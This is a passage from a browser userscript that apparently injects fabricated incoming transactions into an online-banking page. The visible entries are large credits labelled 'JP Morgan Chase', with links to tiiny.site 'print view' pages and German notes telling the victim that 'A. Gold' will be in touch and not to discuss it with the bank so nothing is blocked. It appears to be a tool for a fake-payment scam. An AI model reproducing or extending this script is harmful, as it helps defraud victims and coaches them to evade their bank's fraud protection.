// ==UserScript==
// @name         Ed Start 4 Rec Sp schuetze.hh@gmail.com
...
// @downloadURL https://update.greasyfork.org/scripts/503547/Ed%20Start%204%20Rec%20Sp%20schuetzehh%40gmailcom.user.js
// @updateURL https://update.greasyfork.org/scripts/503547/Ed%20Start%204%20Rec%20Sp%20schuetzehh%40gmailcom.meta.js
// ==/UserScript==
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    ...
    var accountsecurity = "1502 6417 62";
...
//        },
    {
         ...
         {
           predecimalAmount: '10.700',
            decimalAmount: ',00',
           transactionTitle: 'JP Morgan Chase.',  /// !!! NEEDS TO BE DIFFERENT FROM OTHERS
            transactionInfo: " A. Gold meldet sich. Geld für Unterlagen ",
           isNegative: false , // Example flag, modify this based on your actual logic
             transactionLink: 'https://druckansicht.tiiny.site/' // Custom link for the transaction
        },
        {
            predecimalAmount: '77.972',
            decimalAmount: ',50',
            transactionTitle: 'JP Morgan Chase',  /// !!! NEEDS TO BE DIFFERENT FROM OTHERS
            transactionInfo: "Freigabe erteilt. A. Gold meldet sich. Mit Bank nicht besprechen, damit nicht gesperrt.",
            isNegative: false, // Example flag, modify this based on your actual logic,
            transactionLink: 'https://druckansicht77972gut.tiiny.site/' // Custom link for the transaction
        },
